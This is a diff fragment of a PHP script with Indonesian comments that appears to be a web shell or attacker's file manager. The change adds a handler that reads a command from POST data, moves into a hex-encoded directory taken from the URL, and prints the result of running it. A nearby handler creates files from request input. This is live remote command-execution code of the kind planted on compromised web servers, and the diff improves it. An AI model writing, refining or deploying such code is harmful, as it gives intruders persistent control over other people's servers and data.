@@ -403,7 +403,12 @@
             }
         }
         // CMD sesuai dengan direktori di URL
-function exe($cmd) {
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];  // Menggunakan variabel $cmd sesuai kode Anda
+    $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
+    chdir($path);  // Berpindah ke direktori target jika diperlukan
+    echo "<div class='mt-4'>";
+
     $output = '';      // Variabel untuk menyimpan output
     $resultCode = 1;   // Default nilai result code untuk error
 
@@ -471,9 +476,9 @@ function exe($cmd) {
 output_result:
     // Output result
     echo "<pre>Result Code: $resultCode</pre>";
-    echo "<pre>$output</pre>";
+    echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>"; // Menghindari XSS
+    echo "</div>";
 }
-
         // Create a new file
         if (isset($_POST['createFile'])) {
             $fileName = $_POST['fileName'];
